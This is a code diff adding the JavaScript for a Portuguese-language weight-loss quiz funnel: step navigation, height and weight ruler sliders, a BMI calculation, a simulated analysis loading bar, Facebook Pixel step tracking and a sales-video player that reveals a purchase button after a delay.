+            const stepId = parseInt(stepCard.id.split("-")[1]);
+            
+            // Salva as respostas selecionadas
+            const selectedVals = [];
+            stepCard.querySelectorAll(".selected").forEach(el => {
+                selectedVals.push(el.getAttribute("data-value"));
+            });
+            quizState.answers[`step-${stepId}`] = selectedVals;
+            saveQuizStateToStorage();
+            
+            navigateTo(stepId + 1);
+        });
+    });
+
+    // Botão Voltar
+    backBtn.addEventListener("click", () => {
+        if (quizState.history.length > 0) {
+            const prevStep = quizState.history.pop();
+            showStep(prevStep, false);
+        }
+    });
+
+    // Step 7: Especial - Switch "Corpo Inteiro"
+    const fullBodyToggle = document.getElementById("toggle-full-body");
+    if (fullBodyToggle) {
+        fullBodyToggle.addEventListener("change", (e) => {
+            const stepCard = document.getElementById("step-7");
+            const checkboxes = stepCard.querySelectorAll(".option-checkbox-img");
+            
+            checkboxes.forEach(cb => {
+                if (e.target.checked) {
+                    cb.classList.add("selected");
+                } else {
+                    cb.classList.remove("selected");
+                }
+            });
+            updateMultiSelectButtonState(stepCard);
+        });
+    }
+
+    // Step 19: Especial - Validação campo idade
+    const ageInput = document.getElementById("input-age");
+    const nextAgeBtn = document.getElementById("btn-next-age");
+    if (ageInput && nextAgeBtn) {
+        ageInput.addEventListener("input", (e) => {
+            const val = parseInt(e.target.value);
+            if (val >= 10 && val <= 110) {
+                nextAgeBtn.removeAttribute("disabled");
+            } else {
+                nextAgeBtn.setAttribute("disabled", "true");
+            }
+        });
+        
+        nextAgeBtn.addEventListener("click", () => {
+            quizState.age = parseInt(ageInput.value);
+            quizState.answers["step-19-age"] = quizState.age;
+            saveQuizStateToStorage();
+            navigateTo(20);
+        });
+    }
+}
+
+// Habilita ou desabilita o botão de avançar de multi-seleções baseado na seleção de itens
+function updateMultiSelectButtonState(stepCard) {
+    const selectedCount = stepCard.querySelectorAll(".selected").length;
+    const nextBtn = stepCard.querySelector(".btn-next-multi");
+    if (nextBtn) {
+        if (selectedCount > 0) {
+            nextBtn.removeAttribute("disabled");
+        } else {
+            nextBtn.setAttribute("disabled", "true");
+        }
+    }
+    
+    // Sincroniza o toggle corpo inteiro no step 7 se tudo for desmarcado
+    if (stepCard.id === "step-7" && selectedCount === 0) {
+        const fullBodyToggle = document.getElementById("toggle-full-body");
+        if (fullBodyToggle) fullBodyToggle.checked = false;
+    }
+}
+
+// Navegação para um passo específico salvando histórico
+function navigateTo(stepNumber) {
+    quizState.history.push(quizState.currentStep);
+    showStep(stepNumber, true);
+}
+
+// Mostra o passo e executa lógicas de cada tela específica
+function showStep(stepNumber, isMovingForward) {
+    // Esconde todos os passos
+    document.querySelectorAll(".step-card").forEach(card => card.classList.remove("active"));
+    
+    // Atualiza o estado atual
+    quizState.currentStep = stepNumber;
+    
+    // Mostra o passo alvo
+    const targetCard = document.getElementById(`step-${stepNumber}`);
+    if (targetCard) {
+        targetCard.classList.add("active");
+    }
+
+    // Gerenciamento do botão voltar
+    const backBtn = document.getElementById("btn-back");
+    if (stepNumber === 1 || stepNumber === 29 || stepNumber === 35) {
+        backBtn.style.visibility = "hidden";
+    } else {
+        backBtn.style.visibility = "visible";
+    }
+
+    // Barra de Progresso Superior
+    const totalSteps = 35;
+    const progressPct = Math.round((stepNumber / totalSteps) * 100);
+    document.getElementById("quiz-progress").style.width = `${progressPct}%`;
+
+    // Rolagem para o topo automática
+    window.scrollTo({ top: 0, behavior: "smooth" });
+
+    // Disparar pixel de Rastreamento do Passo
+    trackStep(stepNumber);
+
+    // EVENTOS ESPECÍFICOS DE ETAPAS
+    if (stepNumber === 16) {
+        syncRulerPosition("height");
+    } else if (stepNumber === 17) {
+        syncRulerPosition("weight");
+        calculateBMI();
+    } else if (stepNumber === 18) {
+        syncRulerPosition("target-weight");
+    } else if (stepNumber === 29) {
+        runLoadingProgress();
+    } else if (stepNumber === 30) {
+        // Atualiza a projeção de peso dinamicamente
+        const targetVal = Math.round(quizState.targetWeightKg);
+        const startVal = Math.round(quizState.weightKg);
+        
+        document.getElementById("proj-target-weight").textContent = `${targetVal}kg`;
+        document.getElementById("proj-start-weight-badge").textContent = `${startVal}kg`;
+        document.getElementById("proj-target-weight-badge").textContent = `${targetVal}kg`;
+    } else if (stepNumber === 31) {
+        updateBMIGauge();
+    } else if (stepNumber === 33) {
+        // Atualiza data dinâmica hoje + 21 dias
+        const dynamicDate = getDynamicDate(21);
+        document.getElementById("conf-dynamic-date").textContent = dynamicDate;
+    } else if (stepNumber === 34) {
+        const dynamicDate = getDynamicDate(21);
+        document.getElementById("plan-dynamic-date").textContent = dynamicDate;
+        
+        // Atualiza peso atual e desejado no comparativo
+        document.getElementById("comp-start-w").textContent = `${Math.round(quizState.weightKg)} kg`;
+        document.getElementById("comp-target-w").textContent = `${Math.round(quizState.targetWeightKg)} kg`;
+        
+        // Categoria de Gordura Atual baseada no IMC
+        const heightM = quizState.heightCm / 100;
+        const imc = quizState.weightKg / (heightM * heightM);
+        let fatText = "Normal";
+        if (imc >= 25 && imc < 30) fatText = "Acima do normal";
+        else if (imc >= 30) fatText = "Muito acima";
+        else if (imc < 18.5) fatText = "Abaixo do normal";
+        
+        document.getElementById("comp-fat-status").textContent = fatText;
+    } else if (stepNumber === 35) {
+        applyUTMsToCTA();
+    }
+
+    // Persiste a etapa atual no localStorage para que ela não mude ao atualizar a página
+    saveQuizStateToStorage();
+}
+
+// Retorna data formatada dinamicamente (Hoje + N dias)
+function getDynamicDate(daysToAdd) {
+    const targetDate = new Date();
+    targetDate.setDate(targetDate.getDate() + daysToAdd);
+    
+    const day = String(targetDate.getDate()).padStart(2, '0');
+    const months = [
+        "janeiro", "fevereiro", "março", "abril", "maio", "junho",
+        "julho", "agosto", "setembro", "outubro", "novembro", "dezembro"
+    ];
+    const month = months[targetDate.getMonth()];
+    
+    return `${day} de ${month}`;
+}
+
+// Simulação de barra de progresso da Etapa 29
+function runLoadingProgress() {
+    const loadingBar = document.getElementById("loading-bar-fill");
+    const pctText = document.getElementById("loading-pct-number");
+    const loadingImg = document.getElementById("loading-image");
+
+    if (!loadingBar || !pctText) return;
+
+    const imagens = [
+        "https://i.imgur.com/fE2V2WR.png",
+        "https://i.imgur.com/OUNxm8l.png",
+        "https://i.imgur.com/Jns4iQj.png"
+    ];
+
+    function trocarImagem(src){
+        if (!loadingImg || loadingImg.src === src) return;
+        loadingImg.style.transition = "opacity 0.5s ease";
+        loadingImg.style.opacity = "0";
+        setTimeout(() => {
+            loadingImg.src = src;
+            loadingImg.style.opacity = "1";
+        }, 250);
+    }
+
+    if (loadingImg) {
+        loadingImg.style.opacity = "1";
+        loadingImg.src = imagens[0];
+    }
+
+    let currentPct = 0;
+    loadingBar.style.width = "0%";
+    pctText.textContent = "0";
+
+    const intervalTime = 60; // ms
+    const totalDuration = 6000; // 6 segundos
+    const stepIncrement = 100 / (totalDuration / intervalTime);
+    let lastImgIdx = 0;
+
+    const timer = setInterval(() => {
+        currentPct += stepIncrement;
+        if (currentPct >= 100) {
+            currentPct = 100;
+            clearInterval(timer);
+            setTimeout(() => {
+                navigateTo(30);
+            }, 400);
+        }
+        loadingBar.style.width = `${currentPct}%`;
+        pctText.textContent = Math.floor(currentPct);
+
+        if (currentPct >= 33 && lastImgIdx < 1) {
+            lastImgIdx = 1;
+            trocarImagem(imagens[1]);
+        }
+        if (currentPct >= 66 && lastImgIdx < 2) {
+            lastImgIdx = 2;
+            trocarImagem(imagens[2]);
+        }
+    }, intervalTime);
+}
+
+/* ==========================================
+   3. RASTREAMENTO E PIXELS (FAVORING UTMs)
+   ========================================== */
+function initTracking() {
+    console.log("Iniciando rastreadores.");
+}
+
+function trackStep(stepNumber) {
+    console.log(`Disparando pageview do passo: ${stepNumber}`);
+    
+    // Dispara evento geral personalizado no FB Pixel
+    if (typeof fbq === 'function') {
+        fbq('trackCustom', `QuizStep_${stepNumber}`, {
+            step: stepNumber
+        });
+        
+        // Eventos especiais
+        if (stepNumber === 1) {
+            fbq('track', 'Search'); // Simula início
+        }
+        if (stepNumber === 29) {
+            fbq('trackCustom', 'QuizAnalyzing');
+        }
+        if (stepNumber === 35) {
+            fbq('track', 'Lead'); // Lead coletado
+            fbq('trackCustom', 'QuizCompleted');
+        }
+    }
+}
+
+/* ==========================================
+   4. SISTEMA DE RÉGUA DESLIZANTE (RULER SELECTORS)
+   ========================================== */
+function initRulers() {
+    // Inicialização da régua de Altura
+    setupRuler("height", RULER_CONFIGS.height.cm, val => {
+        if (quizState.heightUnit === 'cm') {
+            quizState.heightCm = val;
+        } else {
+            quizState.heightCm = val * 2.54; // Converte pol para cm
+        }
+        document.getElementById("height-value").textContent = Math.round(val);
+    });
+
+    // Inicialização da régua de Peso
+    setupRuler("weight", RULER_CONFIGS.weight.kg, val => {
+        if (quizState.weightUnit === 'kg') {
+            quizState.weightKg = val;
+        } else {
+            quizState.weightKg = val * 0.45359237; // Converte lb para kg
+        }
+        document.getElementById("weight-value").textContent = Math.round(val);
+        calculateBMI();
+    });
+
+    // Inicialização da régua de Peso Alvo
+    setupRuler("target-weight", RULER_CONFIGS.targetWeight.kg, val => {
+        if (quizState.targetWeightUnit === 'kg') {
+            quizState.targetWeightKg = val;
+        } else {
+            quizState.targetWeightKg = val * 0.45359237;
+        }
+        document.getElementById("target-weight-value").textContent = Math.round(val);
+    });
+
+    // Trata botões de navegação das réguas
+    document.getElementById("btn-next-height").addEventListener("click", () => {
+        quizState.answers["height_cm"] = quizState.heightCm;
+        saveQuizStateToStorage();
+        navigateTo(17);
+    });
+
+    document.getElementById("btn-next-weight").addEventListener("click", () => {
+        quizState.answers["weight_kg"] = quizState.weightKg;
+        saveQuizStateToStorage();
+        navigateTo(18);
+    });
+
+    document.getElementById("btn-next-target-weight").addEventListener("click", () => {
+        quizState.answers["target_weight_kg"] = quizState.targetWeightKg;
+        saveQuizStateToStorage();
+        navigateTo(19);
+    });
+
+    // Trata toggles de unidades (CM/POL e KG/LIBRA)
+    setupUnitToggles();
+}
+
+function setupRuler(measure, config, onValueChange) {
+    const track = document.getElementById(`${measure}-ruler-track`);
+    const container = document.getElementById(`${measure}-ruler-container`);
+    
+    if (!track || !container) return;
+    
+    // Limpa a track
+    track.innerHTML = "";
+    
+    const { min, max, labelFreq, pixelPerTick } = config;
+    const totalTicks = max - min;
+    
+    // Define largura do track baseado nos ticks
+    track.style.width = `${(totalTicks * pixelPerTick) + 2}px`;
+    
+    // Gera os traços (ticks) da régua
+    for (let i = min; i <= max; i++) {
+        const tick = document.createElement("div");
+        tick.className = "ruler-tick";
+        
+        // Verifica se é um traço maior com etiqueta ou menor
+        if (i % labelFreq === 0) {
+            tick.classList.add("tick-major");
+            const label = document.createElement("span");
+            label.className = "tick-label";
+            label.textContent = i;
+            tick.appendChild(label);
+        } else {
+            tick.classList.add("tick-minor");
+        }
+        
+        // Define a largura do espaçamento
+        if (i < max) {
+            tick.style.marginRight = `${pixelPerTick - 2.5}px`;
+        }
+        
+        track.appendChild(tick);
+    }
+    
+    // Evento de Rolagem
+    let scrollTimer = null;
+    container.addEventListener("scroll", () => {
+        const scrollLeft = container.scrollLeft;
+        const tickIndex = Math.round(scrollLeft / pixelPerTick);
+        const currentValue = min + tickIndex;
+        
+        // Garante limites seguros
+        const finalVal = Math.max(min, Math.min(max, currentValue));
+        onValueChange(finalVal);
+        
+        // Snap effect suave quando a rolagem para
+        clearTimeout(scrollTimer);
+        scrollTimer = setTimeout(() => {
+            container.scrollTo({
+                left: tickIndex * pixelPerTick,
+                behavior: 'smooth'
+            });
+        }, 150);
+    });
+}
+
+function syncRulerPosition(measure) {
+    const container = document.getElementById(`${measure}-ruler-container`);
+    if (!container) return;
+
+    let unit = 'cm';
+    if (measure === 'weight' || measure === 'target-weight') {
+        unit = (measure === 'weight') ? quizState.weightUnit : quizState.targetWeightUnit;
+    } else {
+        unit = quizState.heightUnit;
+    }
+
+    const config = RULER_CONFIGS[measure][unit];
+    let rawVal = 0;
+
+    if (measure === 'height') {
+        rawVal = (unit === 'cm') ? quizState.heightCm : (quizState.heightCm / 2.54);
+    } else if (measure === 'weight') {
+        rawVal = (unit === 'kg') ? quizState.weightKg : (quizState.weightKg / 0.45359237);
+    } else if (measure === 'target-weight') {
+        rawVal = (unit === 'kg') ? quizState.targetWeightKg : (quizState.targetWeightKg / 0.45359237);
+    }
+
+    const val = Math.max(config.min, Math.min(config.max, rawVal));
+    const tickIndex = val - config.min;
+    
+    // Faz a rolagem síncrona
+    setTimeout(() => {
+        container.scrollLeft = tickIndex * config.pixelPerTick;
+    }, 50);
+}
+
+function setupUnitToggles() {
+    // Toggle Altura (cm / pol)
+    const heightToggleCard = document.getElementById("step-16");
+    heightToggleCard?.querySelectorAll(".btn-unit").forEach(btn => {
+        btn.addEventListener("click", (e) => {
+            const unit = e.target.getAttribute("data-unit");
+            if (quizState.heightUnit === unit) return;
+            
+            // Ativa botão visualmente
+            heightToggleCard.querySelectorAll(".btn-unit").forEach(b => b.classList.remove("active"));
+            e.target.classList.add("active");
+            
+            quizState.heightUnit = unit;
+            document.getElementById("height-unit").textContent = unit;
+            saveQuizStateToStorage();
+            
+            // Recria a régua com a nova escala
+            setupRuler("height", RULER_CONFIGS.height[unit], val => {
+                if (unit === 'cm') {
+                    quizState.heightCm = val;
+                } else {
+                    quizState.heightCm = val * 2.54;
+                }
+                document.getElementById("height-value").textContent = Math.round(val);
+            });
+            
+            // Sincroniza a posição
+            syncRulerPosition("height");
+        });
+    });
+
+    // Toggle Peso (kg / Libra)
+    const weightToggleCard = document.getElementById("step-17");
+    weightToggleCard?.querySelectorAll(".btn-unit").forEach(btn => {
+        btn.addEventListener("click", (e) => {
+            const unit = e.target.getAttribute("data-unit");
+            if (quizState.weightUnit === unit) return;
+            
+            weightToggleCard.querySelectorAll(".btn-unit").forEach(b => b.classList.remove("active"));
+            e.target.classList.add("active");
+            
+            quizState.weightUnit = unit;
+            document.getElementById("weight-unit").textContent = unit === 'kg' ? 'kg' : 'lb';
+            saveQuizStateToStorage();
+            
+            setupRuler("weight", RULER_CONFIGS.weight[unit], val => {
+                if (unit === 'kg') {
+                    quizState.weightKg = val;
+                } else {
+                    quizState.weightKg = val * 0.45359237;
+                }
+                document.getElementById("weight-value").textContent = Math.round(val);
+                calculateBMI();
+            });
+            syncRulerPosition("weight");
+        });
+    });
+
+    // Toggle Peso Alvo (kg / Libra)
+    const targetWeightToggleCard = document.getElementById("step-18");
+    targetWeightToggleCard?.querySelectorAll(".btn-unit").forEach(btn => {
+        btn.addEventListener("click", (e) => {
+            const unit = e.target.getAttribute("data-unit");
+            if (quizState.targetWeightUnit === unit) return;
+            
+            targetWeightToggleCard.querySelectorAll(".btn-unit").forEach(b => b.classList.remove("active"));
+            e.target.classList.add("active");
+            
+            quizState.targetWeightUnit = unit;
+            document.getElementById("target-weight-unit").textContent = unit === 'kg' ? 'kg' : 'lb';
+            saveQuizStateToStorage();
+            
+            setupRuler("target-weight", RULER_CONFIGS.targetWeight[unit], val => {
+                if (unit === 'kg') {
+                    quizState.targetWeightKg = val;
+                } else {
+                    quizState.targetWeightKg = val * 0.45359237;
+                }
+                document.getElementById("target-weight-value").textContent = Math.round(val);
+            });
+            syncRulerPosition("target-weight");
+        });
+    });
+}
+
+/* ==========================================
+   5. CÁLCULO DE IMC E ATUALIZAÇÃO DE GAUGES
+   ========================================== */
+function calculateBMI() {
+    const heightM = quizState.heightCm / 100;
+    if (!heightM) return;
+
+    const imc = quizState.weightKg / (heightM * heightM);
+    const imcFormatted = imc.toFixed(2);
+    
+    let status = "sobrepeso";
+    let colorClass = "color-highlight";
+    
+    if (imc < 18.5) {
+        status = "abaixo do peso";
+        colorClass = "color-highlight";
+    } else if (imc >= 18.5 && imc < 25) {
+        status = "normal";
+        colorClass = "color-green";
+    } else if (imc >= 25 && imc < 30) {
+        status = "sobrepeso";
+        colorClass = "color-highlight";
+    } else {
+        status = "obeso";
+        colorClass = "color-highlight";
+    }
+    
+    const feedbackBox = document.getElementById("imc-feedback-p17");
+    if (feedbackBox) {
+        feedbackBox.innerHTML = `
+            <p class="imc-feedback-text">
+                Seu IMC é <strong>${imcFormatted}</strong>, que é considerado <strong class="${colorClass}">${status}</strong>.
+                Mantenha-se positivo e concentre-se em uma dieta equilibrada e exercícios.
+            </p>
+        `;
+    }
+}
+
+function updateBMIGauge() {
+    const heightM = quizState.heightCm / 100;
+    if (!heightM) return;
+    
+    const imc = quizState.weightKg / (heightM * heightM);
+    const imcFormatted = imc.toFixed(1);
+    
+    // Mapeia o IMC (escala de 15 a 40) para percentagem na barra (0% a 100%)
+    const minImc = 15;
+    const maxImc = 40;
+    let percent = ((imc - minImc) / (maxImc - minImc)) * 100;
+    percent = Math.max(0, Math.min(100, percent)); // Limita de 0 a 100
+    
+    const pointerWrap = document.getElementById("imc-gauge-pointer-wrap");
+    const pointerLbl = document.getElementById("imc-gauge-lbl");
+    
+    if (pointerWrap && pointerLbl) {
+        pointerWrap.style.left = `${percent}%`;
+        pointerLbl.textContent = `Você - ${imcFormatted}`;
+    }
+
+    // Preenche o perfil de Estilo de Vida com base nas respostas dadas anteriormente
+    const profileLifestyle = document.getElementById("profile-lifestyle");
+    if (profileLifestyle) {
+        const typDay = quizState.answers["step-20"] || "Sedentário";
+        profileLifestyle.textContent = typDay;
+    }
+}
+
+/* ==========================================
+   6. SIMULAÇÃO DO PLAYER DE VÍDEO VSL (VTURB)
+   ========================================== */
+function initVSLPlayer() {
+    const video = document.getElementById("vsl-real-video");
+    const overlay = document.getElementById("vturb-overlay");
+    const playBtn = document.getElementById("vsl-play-btn");
+    const playerWrapper = document.getElementById("vsl-player-overlay");
+    const ctaBox = document.getElementById("vsl-cta-box");
+    
+    if (!video) return;
+
+    // Ação de Clique do Botão de Continuar no Overlay
+    document.getElementById("vturb-btn-continue")?.addEventListener("click", (e) => {
+        e.stopPropagation();
+        overlay.classList.remove("active");
+        video.play().catch(err => console.log(err));
+        showCTAWithDelay();
+    });
+
+    // Ação de Recomeçar o vídeo
+    document.getElementById("vturb-btn-restart")?.addEventListener("click", (e) => {
+        e.stopPropagation();
+        overlay.classList.remove("active");
+        video.currentTime = 0;
+        video.play().catch(err => console.log(err));
+        showCTAWithDelay();
+    });
+
+    // Controla Play/Pause clicando no player
+    playerWrapper?.addEventListener("click", () => {
+        if (video.paused) {
+            video.play().catch(err => console.log(err));
+            overlay.classList.remove("active");
+        } else {
+            video.pause();
+            overlay.classList.add("active");
+        }
+    });
+
+    // Atualiza ícone do botão play/pause
+    video.addEventListener("play", () => {
+        playBtn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>`;
+        showCTAWithDelay();
+    });
+
+    video.addEventListener("pause", () => {
+        playBtn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>`;
+    });
+
+    // Liberação do CTA do Botão de Compra
+    let ctaTimer = null;
+    function showCTAWithDelay() {
+        if (ctaTimer) return; // Garante execução única
+        
+        // Em VSLs de conversão, o botão de compra é liberado após um tempo chave (ex: 5 segundos para teste, ou 5 minutos)
+        // Colocamos 5 segundos (5000ms) para ficar fácil de verificar
+        ctaTimer = setTimeout(() => {
+            if (ctaBox) {
+                ctaBox.style.display = "block";
+                ctaBox.scrollIntoView({ behavior: "smooth" });
+                console.log("CTA de compra exibido com sucesso!");
+            }
+        }, 5000);
+    }
+}
+</script>
+</body>
+</html>
